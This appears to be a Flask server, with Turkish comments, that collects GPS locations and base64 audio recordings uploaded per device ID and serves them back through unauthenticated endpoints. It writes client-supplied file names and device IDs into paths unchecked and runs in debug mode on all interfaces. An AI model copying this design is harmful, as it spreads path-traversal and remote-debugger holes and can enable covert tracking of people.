"""
Basit Flask sunucu örneği - Veri almak için
Gerçek kullanımda daha güvenli bir yapı kullanın (authentication, encryption, vb.)
"""

from flask import Flask, request, jsonify
from flask_cors import CORS
import json
import base64
import os
from datetime import datetime

app = Flask(__name__)
CORS(app)

# Verileri saklamak için klasör
DATA_DIR = "uploaded_data"
os.makedirs(DATA_DIR, exist_ok=True)

@app.route('/api/upload', methods=['POST'])
def upload_data():
    try:
        data = request.get_json()
        
        if not data:
            return jsonify({"error": "No data received"}), 400
        
        device_id = data.get('device_id', 'unknown')
        data_type = data.get('type', 'unknown')
        timestamp = datetime.now().isoformat()
        
        # Veriyi kaydet
        if data_type == 'location':
            save_location_data(device_id, data, timestamp)
        elif data_type == 'audio':
            save_audio_data(device_id, data, timestamp)
        else:
            save_generic_data(device_id, data, timestamp)
        
        return jsonify({"status": "success", "message": "Data received"}), 200
        
    except Exception as e:
        print(f"Error: {str(e)}")
        return jsonify({"error": str(e)}), 500

def save_location_data(device_id, data, timestamp):
    """Konum verilerini kaydet"""
    location_file = os.path.join(DATA_DIR, f"{device_id}_locations.json")
    
    location_entry = {
        "timestamp": timestamp,
        "latitude": data.get('latitude'),
        "longitude": data.get('longitude'),
        "altitude": data.get('altitude'),
        "accuracy": data.get('accuracy'),
        "speed": data.get('speed'),
        "course": data.get('course')
    }
    
    # Mevcut verileri oku
    locations = []
    if os.path.exists(location_file):
        with open(location_file, 'r') as f:
            locations = json.load(f)
    
    # Yeni veriyi ekle
    locations.append(location_entry)
    
    # Kaydet
    with open(location_file, 'w') as f:
        json.dump(locations, f, indent=2)
    
    print(f"📍 Location saved for device {device_id}")

def save_audio_data(device_id, data, timestamp):
    """Ses verilerini kaydet"""
    audio_data = data.get('audio_data')
    filename = data.get('filename', f"audio_{timestamp}.m4a")
    
    if audio_data:
        # Base64'ten decode et
        audio_bytes = base64.b64decode(audio_data)
        
        # Dosyayı kaydet
        audio_dir = os.path.join(DATA_DIR, device_id, "audio")
        os.makedirs(audio_dir, exist_ok=True)
        
        audio_path = os.path.join(audio_dir, filename)
        with open(audio_path, 'wb') as f:
            f.write(audio_bytes)
        
        print(f"🎤 Audio saved for device {device_id}: {filename}")
    
    # Metadata'yı kaydet
    metadata_file = os.path.join(DATA_DIR, f"{device_id}_audio_metadata.json")
    metadata = []
    if os.path.exists(metadata_file):
        with open(metadata_file, 'r') as f:
            metadata = json.load(f)
    
    metadata.append({
        "timestamp": timestamp,
        "filename": filename,
        "size": len(audio_data) if audio_data else 0
    })
    
    with open(metadata_file, 'w') as f:
        json.dump(metadata, f, indent=2)

def save_generic_data(device_id, data, timestamp):
    """Genel verileri kaydet"""
    generic_file = os.path.join(DATA_DIR, f"{device_id}_generic.json")
    
    entry = {
        "timestamp": timestamp,
        "data": data
    }
    
    entries = []
    if os.path.exists(generic_file):
        with open(generic_file, 'r') as f:
            entries = json.load(f)
    
    entries.append(entry)
    
    with open(generic_file, 'w') as f:
        json.dump(entries, f, indent=2)

@app.route('/api/devices', methods=['GET'])
def get_devices():
    """Tüm cihazları listele"""
    devices = set()
    
    for filename in os.listdir(DATA_DIR):
        if '_' in filename:
            device_id = filename.split('_')[0]
            devices.add(device_id)
    
    return jsonify({"devices": list(devices)})

@app.route('/api/device/<device_id>/locations', methods=['GET'])
def get_device_locations(device_id):
    """Belirli bir cihazın konum verilerini getir"""
    location_file = os.path.join(DATA_DIR, f"{device_id}_locations.json")
    
    if os.path.exists(location_file):
        with open(location_file, 'r') as f:
            locations = json.load(f)
        return jsonify({"locations": locations})
    else:
        return jsonify({"locations": []})

@app.route('/api/device/<device_id>/audio', methods=['GET'])
def get_device_audio_metadata(device_id):
    """Belirli bir cihazın ses metadata'sını getir"""
    metadata_file = os.path.join(DATA_DIR, f"{device_id}_audio_metadata.json")
    
    if os.path.exists(metadata_file):
        with open(metadata_file, 'r') as f:
            metadata = json.load(f)
        return jsonify({"audio": metadata})
    else:
        return jsonify({"audio": []})

if __name__ == '__main__':
    print("🚀 Server starting on http://localhost:5000")
    print("📁 Data will be saved to:", os.path.abspath(DATA_DIR))
    app.run(host='0.0.0.0', port=5000, debug=True)

